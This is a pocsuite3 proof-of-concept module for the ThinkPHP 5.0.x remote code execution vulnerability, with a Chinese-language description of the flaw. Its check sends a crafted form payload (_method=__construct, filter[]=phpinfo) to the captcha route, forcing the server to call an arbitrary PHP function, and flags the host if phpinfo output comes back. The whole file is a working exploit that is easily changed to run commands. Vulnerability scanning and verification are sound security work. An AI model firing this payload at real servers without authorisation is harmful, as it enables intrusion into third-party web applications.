"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list


class Thinkphp(POCBase):
    vulID = '97767'  # ssvid
    version = '1.0'
    author = ['chenghs']
    vulDate = '2019-1-11'
    createDate = '2019-1-11'
    updateDate = '2019-1-11'
    references = ['https://www.seebug.org/vuldb/ssvid-97765']
    name = 'Thinkphp 5.0.x 远程代码执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'thinkphp'
    appVersion = 'thinkphp5.0.23'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _check(self):
        result = []
        flag = 'PHP Extension Build'
        url = self.url.strip()
        full_url = f"{url}/index.php?s=captcha"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
                   "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"_method": "__construct", "filter[]": "phpinfo", "method": "get", "server[REQUEST_METHOD]": "1"}
        try:
            response = requests.post(full_url, headers=headers, data=data,verify=False, timeout=5,
                                     allow_redirects=False)
            if flag in response.text:
                result.append(url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        p = self._check()
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.name

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(Thinkphp)
